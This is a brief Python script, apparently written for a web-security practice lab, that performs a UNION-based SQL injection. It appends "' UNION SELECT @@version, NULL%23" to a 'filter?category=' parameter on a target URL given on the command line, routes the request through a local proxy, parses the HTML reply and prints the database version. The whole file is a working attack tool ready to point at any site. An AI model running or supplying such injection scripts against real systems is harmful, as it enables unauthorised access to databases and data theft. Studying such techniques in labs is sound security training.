#Get Database version and server using @@version, # = (%23)

import requests
import sys
import urllib3
from bs4 import BeautifulSoup
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

proxies = {'http':'http://127.0.0.1:8080', 'https':'http://127.0.0.1:8080'}
path = 'filter?category='
payload = "' UNION SELECT @@version, NULL%23"

def sqli_payload(url):
	r = requests.get(url + path + payload, verify=False, proxies=proxies)
	soup = BeautifulSoup(r.text, 'html.parser')
	search = soup.find_all('th')
	print(search)
	version = ''.join([th.get_text() for th in search])
	return version

if __name__ == "__main__":
	try:
		url = sys.argv[1].strip()
	except IndexError:
		print(f'\033[31m[-] Usage: {sys.argv[0]} <url>\033[0m')
		print(f'\033[31m[-] Example: {sys.argv[0]} www.example.com\033[0m')
		sys.exit(1)
	try:
		version = sqli_payload(url)
		if version:
			print(f'\033[32m[+] Database Version: {version}\033[0m')
			print('\033[32m[+] SQli successful!\033[0m')
		else:
			print('\033[31m[-] SQLi unsuccessful!!!\033[0m')
	except KeyboardInterrupt:
		print('\n\033[33m[+] Exited...\033[0m')
		sys.exit(0)
